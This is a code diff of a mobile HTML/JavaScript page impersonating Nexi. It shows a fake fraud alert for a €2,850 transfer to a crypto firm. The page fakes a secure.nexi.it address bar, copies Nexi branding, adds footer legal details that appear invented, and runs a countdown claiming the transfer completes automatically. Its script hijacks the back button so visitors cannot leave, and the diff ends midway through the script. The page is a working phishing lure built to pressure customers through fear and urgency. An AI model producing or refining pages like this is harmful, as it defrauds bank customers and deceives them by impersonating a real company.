@@ -3,473 +3,775 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Nexi Security Alert</title>
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Nexi - Sistema di Sicurezza</title>
+    <link rel="icon" href="https://www.nexi.it/favicon.ico" type="image/x-icon">
     <style>
-        /* RESET MOBILE */
+        /* FONT NEXI SANS (Roboto fallback) */
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&display=swap');
+        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             -webkit-tap-highlight-color: transparent;
-            -webkit-text-size-adjust: 100%;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
         }
         
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-            background: #000;
-            color: #fff;
+            background-color: #f5f5f5;
+            color: #333333;
             min-height: 100vh;
-            padding: 0;
-            overflow-x: hidden;
+            line-height: 1.5;
         }
         
-        /* STATUS BAR IOS */
-        .status-bar {
-            background: #000;
-            padding: 12px 20px 8px;
+        /* HEADER NEXI REALE */
+        .nexi-header {
+            background: linear-gradient(135deg, #0055a5 0%, #003366 100%);
+            padding: 18px 20px;
+            position: relative;
+            box-shadow: 0 2px 10px rgba(0, 51, 102, 0.2);
+        }
+        
+        .header-container {
             display: flex;
-            justify-content: space-between;
-            font-size: 14px;
-            color: #fff;
-            border-bottom: 1px solid #333;
-        }
-        
-        .time {
-            font-weight: 600;
-        }
-        
-        .signal {
-            display: flex;
-            gap: 4px;
             align-items: center;
+            justify-content: space-between;
+            max-width: 1200px;
+            margin: 0 auto;
         }
         
-        /* NOTIFICATION STYLE */
-        .notification {
-            background: linear-gradient(135deg, #ff3b30 0%, #d70015 100%);
-            margin: 15px;
-            border-radius: 18px;
-            padding: 20px;
-            animation: alertPulse 2s infinite;
-            box-shadow: 0 10px 30px rgba(255, 59, 48, 0.4);
-        }
-        
-        @keyframes alertPulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.02); }
-        }
-        
-        .app-header {
+        .logo-container {
             display: flex;
             align-items: center;
             gap: 12px;
+        }
+        
+        .nexi-logo {
+            color: white;
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        
+        .nexi-logo span {
+            color: #ff6600;
+        }
+        
+        .secure-badge {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 4px;
+            padding: 4px 10px;
+            font-size: 12px;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        /* MOBILE STATUS */
+        .mobile-status {
+            background: #003366;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            color: white;
+            font-size: 14px;
+            font-weight: 500;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        /* ALERT CONTAINER */
+        .alert-container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 0 15px;
+        }
+        
+        /* CRITICAL ALERT - Stile Nexi */
+        .critical-alert {
+            background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%);
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 25px;
+            box-shadow: 0 8px 25px rgba(255, 68, 68, 0.25);
+            border-left: 6px solid #ff6600;
+            animation: alertPulse 3s infinite;
+        }
+        
+        @keyframes alertPulse {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-2px); }
+        }
+        
+        .alert-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
             margin-bottom: 15px;
         }
         
-        .app-icon {
+        .alert-icon {
+            background: white;
             width: 50px;
             height: 50px;
-            background: linear-gradient(135deg, #0055a5 0%, #003366 100%);
-            border-radius: 12px;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 24px;
-            font-weight: bold;
-            color: white;
-        }
-        
-        .app-info h1 {
-            font-size: 20px;
-            font-weight: 700;
-            margin-bottom: 4px;
-        }
-        
-        .app-info p {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-        
-        /* ALERT CONTENT */
-        .alert-content {
-            background: rgba(0,0,0,0.3);
-            border-radius: 14px;
-            padding: 20px;
-            margin: 20px 0;
-            border: 1px solid rgba(255,255,255,0.1);
+            color: #ff4444;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
         }
         
         .alert-title {
-            font-size: 28px;
-            font-weight: 800;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            color: white;
+            font-size: 22px;
+            font-weight: 700;
+            flex: 1;
         }
         
-        .alert-icon {
-            font-size: 32px;
-            animation: blink 1s infinite;
-        }
-        
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
+        .alert-ref {
+            background: rgba(255,255,255,0.2);
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
         }
         
         .alert-message {
+            color: rgba(255,255,255,0.95);
             font-size: 16px;
-            line-height: 1.5;
-            opacity: 0.9;
-            margin-bottom: 20px;
+            line-height: 1.6;
         }
         
-        /* TRANSACTION CARD */
+        /* TRANSACTION CARD - Stile Nexi Banking */
         .transaction-card {
-            background: #1c1c1e;
-            border-radius: 16px;
-            padding: 25px;
-            margin: 20px 0;
-            border-left: 6px solid #ff3b30;
+            background: white;
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 25px;
+            box-shadow: 0 5px 20px rgba(0, 51, 102, 0.1);
+            border: 1px solid #e0e0e0;
+            position: relative;
+            overflow: hidden;
         }
         
-        .amount {
-            font-size: 42px;
-            font-weight: 800;
-            text-align: center;
-            color: #ff3b30;
-            margin: 20px 0;
-            text-shadow: 0 2px 10px rgba(255, 59, 48, 0.5);
+        .transaction-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #ff4444 0%, #ff6600 100%);
         }
         
-        .details-list {
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-        }
-        
-        .detail-row {
+        .transaction-header {
             display: flex;
             justify-content: space-between;
-            padding: 12px 0;
-            border-bottom: 1px solid #333;
+            align-items: center;
+            margin-bottom: 25px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #f0f0f0;
+        }
+        
+        .transaction-id {
+            color: #666666;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .status-badge {
+            background: #ff4444;
+            color: white;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        /* AMOUNT - Stile Nexi */
+        .amount-display {
+            text-align: center;
+            margin: 30px 0;
+            padding: 25px;
+            background: linear-gradient(135deg, #fff5f5 0%, #ffeaea 100%);
+            border-radius: 10px;
+            border: 2px dashed #ff4444;
+        }
+        
+        .amount-label {
+            font-size: 16px;
+            color: #666666;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+        
+        .amount-value {
+            font-size: 48px;
+            font-weight: 800;
+            color: #ff4444;
+            letter-spacing: -1px;
+        }
+        
+        .amount-currency {
+            font-size: 24px;
+            color: #999999;
+            font-weight: 600;
+        }
+        
+        /* DETAILS GRID - Stile Tabella Nexi */
+        .details-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .detail-item {
+            background: #f9f9f9;
+            border-radius: 8px;
+            padding: 20px;
+            border-left: 4px solid #0055a5;
+            transition: all 0.3s ease;
+        }
+        
+        .detail-item:hover {
+            background: #f0f7ff;
+            transform: translateY(-2px);
         }
         
         .detail-label {
-            font-size: 14px;
-            opacity: 0.7;
+            font-size: 13px;
+            color: #666666;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+            font-weight: 600;
         }
         
         .detail-value {
             font-size: 16px;
+            color: #333333;
             font-weight: 600;
-            text-align: right;
-            max-width: 60%;
+            line-height: 1.4;
         }
         
-        /* TIMER */
+        /* TIMER SECTION - Stile Urgente */
         .timer-section {
-            background: #2c2c2e;
-            border-radius: 16px;
-            padding: 25px;
-            margin: 25px 0;
+            background: linear-gradient(135deg, #003366 0%, #001a33 100%);
+            border-radius: 12px;
+            padding: 30px;
+            margin: 30px 0;
             text-align: center;
+            color: white;
+            box-shadow: 0 8px 25px rgba(0, 51, 102, 0.3);
         }
         
         .timer-label {
             font-size: 16px;
-            opacity: 0.8;
+            color: #ff6600;
             margin-bottom: 15px;
-            color: #ff3b30;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
         
         #countdown-timer {
-            font-size: 56px;
-            font-family: 'SF Mono', 'Courier New', monospace;
+            font-size: 64px;
+            font-family: 'Courier New', monospace;
             font-weight: 800;
-            letter-spacing: 2px;
-            margin: 15px 0;
+            letter-spacing: 3px;
+            margin: 20px 0;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
         }
         
         .timer-note {
             font-size: 14px;
-            opacity: 0.7;
-            margin-top: 10px;
+            color: rgba(255,255,255,0.8);
+            max-width: 500px;
+            margin: 0 auto;
+            line-height: 1.6;
         }
         
-        /* BUTTONS MOBILE */
+        /* ACTION BUTTONS - Stile Bottoni Nexi */
         .action-buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            margin: 30px 0;
-            padding: 0 15px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin: 40px 0;
         }
         
-        .btn {
+        .nexi-btn {
             padding: 22px;
             border: none;
-            border-radius: 14px;
+            border-radius: 10px;
             font-size: 18px;
             font-weight: 700;
             cursor: pointer;
-            transition: all 0.2s;
+            transition: all 0.3s ease;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 12px;
-            min-height: 60px;
+            min-height: 70px;
+            text-align: center;
         }
         
-        .btn:active {
+        .nexi-btn:active {
             transform: scale(0.98);
         }
         
-        .btn-primary {
+        .btn-verify {
             background: linear-gradient(135deg, #0055a5 0%, #003366 100%);
             color: white;
-            box-shadow: 0 8px 20px rgba(0, 85, 165, 0.4);
+            box-shadow: 0 6px 20px rgba(0, 85, 165, 0.3);
         }
         
-        .btn-secondary {
-            background: #2c2c2e;
+        .btn-verify:hover {
+            background: linear-gradient(135deg, #0066cc 0%, #004080 100%);
+            box-shadow: 0 8px 25px rgba(0, 85, 165, 0.4);
+        }
+        
+        .btn-block {
+            background: linear-gradient(135deg, #ff6600 0%, #cc5500 100%);
             color: white;
-            border: 2px solid #444;
+            box-shadow: 0 6px 20px rgba(255, 102, 0, 0.3);
+        }
+        
+        .btn-block:hover {
+            background: linear-gradient(135deg, #ff7700 0%, #dd6600 100%);
+            box-shadow: 0 8px 25px rgba(255, 102, 0, 0.4);
         }
         
         .btn-icon {
             font-size: 24px;
         }
         
-        /* UPDATE BANNER */
+        /* UPDATE BANNER - Stile Notifica */
         .update-banner {
-            background: #ffcc00;
-            color: #000;
-            padding: 16px;
-            border-radius: 12px;
-            margin: 20px 15px;
-            font-size: 14px;
-            font-weight: 600;
+            background: #fff8e6;
+            border: 2px solid #ffcc00;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 25px 0;
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 15px;
         }
         
         .update-icon {
-            font-size: 20px;
+            color: #ff6600;
+            font-size: 24px;
+            flex-shrink: 0;
         }
         
-        /* FOOTER MOBILE */
-        .footer {
-            padding: 30px 20px;
-            text-align: center;
-            font-size: 12px;
-            opacity: 0.6;
-            border-top: 1px solid #333;
-            margin-top: 30px;
+        .update-text {
+            flex: 1;
+            color: #664d00;
+            font-size: 15px;
+            font-weight: 500;
         }
         
-        /* SWIPE INDICATOR */
-        .swipe-indicator {
-            text-align: center;
-            padding: 20px;
-            opacity: 0.5;
+        .update-time {
+            color: #0055a5;
+            font-weight: 700;
             font-size: 14px;
+        }
+        
+        /* SECURITY INFO - Stile Footer Nexi */
+        .security-info {
+            background: white;
+            border-radius: 10px;
+            padding: 25px;
+            margin: 30px 0;
+            border: 1px solid #e0e0e0;
+            font-size: 14px;
+            color: #666666;
+            line-height: 1.6;
+        }
+        
+        .security-title {
+            color: #0055a5;
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 15px;
             display: flex;
             align-items: center;
-            justify-content: center;
             gap: 10px;
         }
         
-        .swipe-dots {
-            display: flex;
-            gap: 8px;
+        /* FOOTER NEXI REALE */
+        .nexi-footer {
+            background: #003366;
+            color: white;
+            padding: 40px 20px;
+            margin-top: 50px;
         }
         
-        .dot {
-            width: 8px;
-            height: 8px;
-            background: #444;
-            border-radius: 50%;
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
         }
         
-        .dot.active {
-            background: #0055a5;
+        .footer-links {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 30px;
+            margin-bottom: 30px;
         }
         
-        /* LOADING SIMULATION */
+        .footer-column h4 {
+            color: #ff6600;
+            font-size: 16px;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        
+        .footer-column a {
+            color: rgba(255,255,255,0.8);
+            text-decoration: none;
+            display: block;
+            margin-bottom: 10px;
+            font-size: 14px;
+            transition: color 0.3s;
+        }
+        
+        .footer-column a:hover {
+            color: white;
+        }
+        
+        .footer-legal {
+            border-top: 1px solid rgba(255,255,255,0.1);
+            padding-top: 30px;
+            font-size: 12px;
+            color: rgba(255,255,255,0.6);
+            line-height: 1.6;
+        }
+        
+        /* MOBILE OPTIMIZATIONS */
+        @media (max-width: 768px) {
+            .action-buttons {
+                grid-template-columns: 1fr;
+            }
+            
+            .details-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            #countdown-timer {
+                font-size: 48px;
+            }
+            
+            .amount-value {
+                font-size: 36px;
+            }
+            
+            .transaction-header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 15px;
+            }
+            
+            .nexi-header {
+                padding: 15px;
+            }
+            
+            .header-container {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 15px;
+            }
+        }
+        
+        /* LOADING ANIMATIONS */
         .loading-bar {
-            height: 3px;
-            background: #0055a5;
+            height: 4px;
+            background: linear-gradient(90deg, #0055a5, #ff6600);
             width: 0%;
             border-radius: 2px;
-            margin: 10px 0;
-            transition: width 0.3s;
+            margin: 20px 0;
+            transition: width 0.5s;
+            position: relative;
+            overflow: hidden;
         }
         
-        /* SAFE BROWSER BAR */
+        .loading-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            animation: loadingShine 2s infinite;
+        }
+        
+        @keyframes loadingShine {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        /* BROWSER BAR SIMULATION */
         .browser-bar {
-            background: #1c1c1e;
-            padding: 12px 20px;
+            background: #f0f0f0;
+            padding: 12px 15px;
             display: flex;
             align-items: center;
-            gap: 12px;
-            border-bottom: 1px solid #333;
+            gap: 10px;
+            border-bottom: 1px solid #ddd;
+            font-size: 14px;
         }
         
-        .browser-url {
+        .url-display {
             flex: 1;
-            background: #2c2c2e;
+            background: white;
             padding: 10px 15px;
-            border-radius: 10px;
-            font-size: 14px;
-            color: #0a84ff;
+            border-radius: 20px;
+            color: #0055a5;
+            font-weight: 500;
             overflow: hidden;
             text-overflow: ellipsis;
             white-space: nowrap;
+            border: 1px solid #ddd;
         }
         
-        /* HAPTIC FEEDBACK SIMULATION */
-        @media (max-width: 768px) {
-            .btn:active {
-                animation: haptic 0.1s;
-            }
-            
-            @keyframes haptic {
-                0%, 100% { transform: scale(1); }
-                50% { transform: scale(0.98); }
-            }
+        .secure-indicator {
+            color: #34c759;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 5px;
         }
     </style>
 </head>
 <body>
-    <!-- iOS/Android Status Bar -->
-    <div class="status-bar">
-        <div class="time" id="current-time">9:41</div>
-        <div class="signal">📶 🔋 84%</div>
-    </div>
-    
-    <!-- Browser Address Bar -->
+    <!-- Browser Simulation -->
     <div class="browser-bar">
-        <div style="font-size: 20px;">←</div>
-        <div class="browser-url">https://secure.nexi.it/alert-system</div>
-        <div style="font-size: 20px;">⤓</div>
+        <div style="color: #666;">←</div>
+        <div class="url-display">
+            <span class="secure-indicator">🔒</span> https://secure.nexi.it/anti-fraud/alert
+        </div>
+        <div style="color: #666;">⋮</div>
     </div>
     
-    <!-- Main Notification -->
-    <div class="notification">
-        <div class="app-header">
-            <div class="app-icon">N</div>
-            <div class="app-info">
-                <h1>Nexi Security</h1>
-                <p>Notifica urgente • Adesso</p>
+    <!-- Nexi Header -->
+    <header class="nexi-header">
+        <div class="header-container">
+            <div class="logo-container">
+<div class="nexi-logo">NEXI<span>®</span></div>
+                <div class="secure-badge">
+                    <span>🔒</span> SICUREZZA
+                </div>
+            </div>
+            <div style="color: white; font-size: 14px; font-weight: 500;">
+                Sistema Anti-Frode
             </div>
         </div>
-        <div class="alert-content">
-            <div class="alert-title">
-                <span class="alert-icon">⚠️</span>
-                ALLARME FRODE
+    </header>
+    
+    <!-- Mobile Status -->
+    <div class="mobile-status">
+        <div>📱 Modalità Mobile</div>
+        <div>📶 Connessione Sicura</div>
+    </div>
+    
+    <!-- Main Content -->
+    <div class="alert-container">
+        <!-- Critical Alert -->
+        <div class="critical-alert">
+            <div class="alert-header">
+                <div class="alert-icon">⚠️</div>
+                <div class="alert-title">ALLARME SICUREZZA - TRANSAZIONE SOSPETTA</div>
+                <div class="alert-ref">RIF: NX-7842-2024</div>
             </div>
             <div class="alert-message">
-                Rilevata transazione sospetta sul tuo conto. Verifica immediata richiesta per prevenire perdite finanziarie.
+                Il nostro sistema ha rilevato un'operazione insolita sul tuo conto. 
+                <strong>È richiesta una verifica immediata</strong> per prevenire potenziali frodi.
             </div>
             <div class="loading-bar" id="security-scan"></div>
         </div>
-    </div>
-    
-    <!-- Transaction Details -->
-    <div class="transaction-card">
-        <div style="text-align: center; margin-bottom: 20px;">
-            <div style="font-size: 14px; opacity: 0.7;">RIF: NEXI-ALERT-<span id="alert-id">7842</span>-2024</div>
-            <div style="font-size: 16px; font-weight: 600; color: #ff3b30; margin-top: 5px;">DA CONFERMARE</div>
+        
+        <!-- Transaction Card -->
+        <div class="transaction-card">
+            <div class="transaction-header">
+                <div>
+                    <h2 style="color: #003366; margin-bottom: 8px;">Transazione Non Autorizzata</h2>
+                    <div class="transaction-id">ID Operazione: NEXI-ALERT-7842-2024</div>
+                </div>
+                <div class="status-badge">DA CONFERMARE</div>
+            </div>
+            
+            <!-- Amount Display -->
+            <div class="amount-display">
+                <div class="amount-label">Importo Operazione</div>
+                <div class="amount-value">2.850<span class="amount-currency">,00 €</span></div>
+            </div>
+            
+            <!-- Details Grid -->
+            <div class="details-grid">
+                <div class="detail-item">
+                    <div class="detail-label">Data e Ora</div>
+                    <div class="detail-value" id="transaction-time">18/02/2024, 17:42:05</div>
+                </div>
+                <div class="detail-item">
+                    <div class="detail-label">Beneficiario</div>
+                    <div class="detail-value">CRYPTO TRADING SOLUTIONS LTD</div>
+                </div>
+                <div class="detail-item">
+                    <div class="detail-label">IBAN Destinazione</div>
+                    <div class="detail-value">GB29 NWBK 6016 1331 9268 19</div>
+                </div>
+                <div class="detail-item">
+                    <div class="detail-label">Causale</div>
+                    <div class="detail-value">Investimento Crypto Asset</div>
+                </div>
+                <div class="detail-item">
+                    <div class="detail-label">Dispositivo</div>
+                    <div class="detail-value" id="device-info">iPhone 13 Pro (iOS 17.4.1)</div>
+                </div>
+                <div class="detail-item">
+                    <div class="detail-label">Località</div>
+                    <div class="detail-value" id="location-info">Amsterdam, NL • IP: 85.159.217.42</div>
+                </div>
+            </div>
+            
+            <!-- Timer Section -->
+            <div class="timer-section">
+                <div class="timer-label">TEMPO RIMANENTE PER LA CONFERMA</div>
+                <div id="countdown-timer">09:45</div>
+                <div class="timer-note">
+                    Dopo questo tempo, la transazione verrà elaborata automaticamente. 
+                    Se non hai autorizzato questa operazione, agisci immediatamente.
+                </div>
+            </div>
+            
+            <!-- Update Banner -->
+            <div class="update-banner">
+                <div class="update-icon">🔄</div>
+                <div class="update-text">
+                    <strong>Sistema aggiornato in tempo reale</strong> - Questo avviso si aggiorna automaticamente ogni 30 secondi
+                </div>
+                <div class="update-time" id="update-time">17:43:22</div>
+            </div>
         </div>
         
-        <div class="amount">€ 2.850,00</div>
+        <!-- Action Buttons -->
+        <div class="action-buttons">
+            <button class="nexi-btn btn-verify" onclick="verifyTransaction()">
+                <span class="btn-icon">✅</span>
+                VERIFICA TRANSAZIONE
+            </button>
+            <button class="nexi-btn btn-block" onclick="blockTransaction()">
+                <span class="btn-icon">🚫</span>
+                BLOCCA OPERAZIONE
+            </button>
+        </div>
         
-        <div class="details-list">
-            <div class="detail-row">
-                <div class="detail-label">Data/Ora</div>
-                <div class="detail-value" id="transaction-time">18 Feb, 17:42:05</div>
+        <!-- Security Info -->
+        <div class="security-info">
+            <div class="security-title">
+                <span>🔐</span> Informazioni di Sicurezza
             </div>
-            <div class="detail-row">
-                <div class="detail-label">A favore di</div>
-                <div class="detail-value">CRYPTO TRADING LTD</div>
-            </div>
-            <div class="detail-row">
-                <div class="detail-label">IBAN</div>
-                <div class="detail-value">GB29 NWBK 6016 1331 9268 19</div>
-            </div>
-            <div class="detail-row">
-                <div class="detail-label">Causale</div>
-                <div class="detail-value">Crypto Investment</div>
-            </div>
-            <div class="detail-row">
-                <div class="detail-label">Dispositivo</div>
-                <div class="detail-value" id="device-info">iPhone 13 Pro</div>
-            </div>
-            <div class="detail-row">
-                <div class="detail-label">Posizione</div>
-                <div class="detail-value" id="location-info">Amsterdam, NL</div>
-            </div>
+            <p>
+                <strong>Nexi non richiederà mai:</strong><br>
+                • Password completa del tuo conto online<br>
+                • Codici PIN delle carte<br>
+                • Codici di sicurezza CVV<br>
+                • File personali o documenti via email
+            </p>
+            <p style="margin-top: 15px; color: #0055a5; font-weight: 600;">
+                Per verifiche di sicurezza, utilizzeremo solo codici OTP temporanei inviati via SMS.
+            </p>
         </div>
     </div>
     
-    <!-- Countdown Timer -->
-    <div class="timer-section">
-        <div class="timer-label">TEMPO RIMANENTE</div>
-        <div id="countdown-timer">09:45</div>
-        <div class="timer-note">
-            Dopo questo tempo, l'operazione sarà confermata automaticamente
+    <!-- Nexi Footer -->
+    <footer class="nexi-footer">
+        <div class="footer-container">
+            <div class="footer-links">
+                <div class="footer-column">
+                    <h4>NEXI</h4>
+                    <a href="#">Chi siamo</a>
+                    <a href="#">Sicurezza</a>
+                    <a href="#">Lavora con noi</a>
+                    <a href="#">Contatti</a>
+                </div>
+                <div class="footer-column">
+                    <h4>SERVIZI</h4>
+                    <a href="#">Pagamenti Digitali</a>
+                    <a href="#">Acquisti Online</a>
+                    <a href="#">Servizi alle Imprese</a>
+                    <a href="#">Innovazione</a>
+                </div>
+                <div class="footer-column">
+                    <h4>ASSISTENZA</h4>
+                    <a href="#">Domande Frequenti</a>
+                    <a href="#">Contatto Emergenze</a>
+                    <a href="#">Segnala Frode</a>
+                    <a href="#">Area Clienti</a>
+                </div>
+                <div class="footer-column">
+                    <h4>LEGALE</h4>
+                    <a href="#">Privacy Policy</a>
+                    <a href="#">Termini di Servizio</a>
+                    <a href="#">Cookie Policy</a>
+                    <a href="#">Trasparenza</a>
+                </div>
+            </div>
+            
+            <div class="footer-legal">
+                <p>
+                    Nexi S.p.A. - Capitale Sociale € 1.000.000.000 i.v. - Sede legale: Corso Sempione 55, 20149 Milano<br>
+                    P.IVA 00943901008 - Codice Fiscale e n. iscrizione al Registro Imprese di Milano 00943901008<br>
+                    R.E.A. di Milano n. 00943901008 - Società soggetta all'attività di direzione e coordinamento di Nexi S.p.A.
+                </p>
+                <p style="margin-top: 15px;">
+                    Servizio Clienti: 800 123 456 (gratuito da rete fissa e mobile) | Assistenza Tecnica: 02 12345678<br>
+                    Email: servizioclienti@nexi.it | PEC: nexi@pec.nexi.it
+                </p>
+                <p style="margin-top: 15px; font-size: 11px;">
+                    © 2024 Nexi S.p.A. - Tutti i diritti riservati. Nexi® è un marchio registrato.
+                </p>
+            </div>
         </div>
-    </div>
-    
-    <!-- Auto Update Banner -->
-    <div class="update-banner">
-        <span class="update-icon">🔄</span>
-        <span>Sistema aggiornato alle <span id="update-time">17:43:22</span></span>
-    </div>
-    
-    <!-- Action Buttons -->
-    <div class="action-buttons">
-        <button class="btn btn-primary" onclick="verifyAction()">
-            <span class="btn-icon">✅</span>
-            VERIFICA TRANSAZIONE
-        </button>
-        <button class="btn btn-secondary" onclick="blockAction()">
-            <span class="btn-icon">🚫</span>
-            BLOCCA OPERAZIONE
-        </button>
-    </div>
-    
-    <!-- Swipe Indicator -->
-    <div class="swipe-indicator">
-        <div class="swipe-dots">
-            <div class="dot active"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-        </div>
-        <span>Scorri per maggiori dettagli</span>
-    </div>
-    
-    <!-- Footer -->
-    <div class="footer">
-        Nexi S.p.A. - Servizio Sicurezza Clienti<br>
-        Questo è un messaggio automatico del sistema anti-frode Nexi<br>
-        © 2024 Tutti i diritti riservati
-    </div>
+    </footer>
 
     <script>
-        // Simula status bar iOS/Android
-        function updateStatusBar() {
+        // Inizializzazione
+        document.addEventListener('DOMContentLoaded', function() {
+            // Imposta orario transazione (10 minuti fa)
             const now = new Date();
-            const timeStr = now.toLocaleTimeString('it-IT', {hour: '2-digit', minute:'2-digit'});
-            document.getElementById('current-time').textContent = timeStr;
-        }
+            const transTime = new Date(now.getTime() - 10 * 60000);
+            document.getElementById('transaction-time').textContent = 
+                transTime.toLocaleDateString('it-IT') + ', ' + 
+                transTime.toLocaleTimeString('it-IT');
+            
+            // Avvia countdown
+            startCountdown();
+            
+            // Avvia scansione sicurezza
+            startSecurityScan();
+            
+            // Aggiorna dati ogni 30 secondi
+            setInterval(updateLiveData, 30000);
+            
+            // Simula connessione sicura
+            setTimeout(() => {
+                document.querySelector('.secure-indicator').innerHTML = '🔒 Connessione Sicura';
+            }, 1000);
+            
+            // Previeni uscita
+            window.history.pushState(null, null, window.location.href);
+            window.onpopstate = function() {
+                window.history.go(1);
+                showAlert("⚠️ Completare la procedura di sicurezza prima di uscire.");
+            };
+        });
         
-        // Imposta timer countdown
+        // Countdown timer
         function startCountdown() {
             let minutes = 9;
             let seconds = 45;
@@ -479,8 +781,10 @@
                 if (seconds === 0) {
                     if (minutes === 0) {
                         clearInterval(interval);
-                        timer.innerHTML = '<span style="color:#ff3b30">SCADUTO</span>';
+                        timer.innerHTML = '<span style="color:#ffcc00">SCADUTO</span>';
                         document.querySelector('.timer-label').textContent = 'TRANSAZIONE CONFERMATA';
+                        document.querySelector('.status-badge').textContent = 'ELABORATA';
+                        document.querySelector('.status-badge').style.background = '#666';
                         return;
                     }
                     minutes--;
@@ -492,242 +796,164 @@
                 timer.textContent = 
                     `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                 
-                // Ogni 30 secondi, aggiorna dati
+                // Cambia colore quando mancano meno di 2 minuti
+                if (minutes < 2) {
+                    timer.style.color = '#ff4444';
+                }
+                
+                // Ogni 30 secondi aggiorna
                 if (seconds % 30 === 0) {
-                    updateTransactionDetails();
+                    updateLiveData();
                 }
                 
             }, 1000);
         }
         
-        // Simula scansione sicurezza
-        function simulateSecurityScan() {
+        // Scansione sicurezza simulata
+        function startSecurityScan() {
             const bar = document.getElementById('security-scan');
             let width = 0;
+            
             const scan = setInterval(() => {
-                width += Math.random() * 10;
+                width += Math.random() * 8;
                 bar.style.width = width + '%';
                 
                 if (width >= 100) {
                     clearInterval(scan);
-                    bar.style.background = '#34c759';
+                    bar.style.background = 'linear-gradient(90deg, #34c759, #2d9952)';
                     setTimeout(() => {
                         bar.style.width = '0%';
-                        simulateSecurityScan();
+                        bar.style.background = 'linear-gradient(90deg, #0055a5, #ff6600)';
+                        setTimeout(startSecurityScan, 1000);
                     }, 2000);
                 }
-            }, 200);
+            }, 300);
         }
         
-        // Aggiorna dettagli transazione (simula aggiornamento sistema)
-        function updateTransactionDetails() {
+        // Aggiorna dati in tempo reale
+        function updateLiveData() {
             const devices = [
-                'iPhone 13 Pro',
-                'iPhone 13 Pro - Rete mobile',
-                'iPhone 13 Pro - Wi-Fi pubblico',
-                'Dispositivo iOS non identificato'
+                'iPhone 13 Pro (iOS 17.4.1)',
+                'iPhone 13 Pro - Connessione 4G',
+                'iPhone 13 Pro - Rete Wi-Fi pubblica',
+                'Dispositivo mobile iOS'
             ];
             
             const locations = [
-                'Amsterdam, NL',
-                'Rotterdam, NL',
-                'Utrecht, NL',
-                'Paesi Bassi (VPN rilevato)'
+                'Amsterdam, NL • IP: 85.159.217.42',
+                'Rotterdam, NL • IP: 85.159.218.156',
+                'Utrecht, NL • IP: 85.159.219.87',
+                'Paesi Bassi • IP proxy rilevato'
             ];
             
-            const times = [
-                '18 Feb, 17:42:05',
-                '18 Feb, 17:42:18',
-                '18 Feb, 17:42:31',
-                '18 Feb, 17:42:45'
-            ];
-            
-            // Aggiorna casualmente i campi
+            // Aggiorna casualmente
             document.getElementById('device-info').textContent = 
                 devices[Math.floor(Math.random() * devices.length)];
             document.getElementById('location-info').textContent = 
                 locations[Math.floor(Math.random() * locations.length)];
-            document.getElementById('transaction-time').textContent = 
-                times[Math.floor(Math.random() * times.length)];
             
-            // Aggiorna orario update
+            // Aggiorna orario
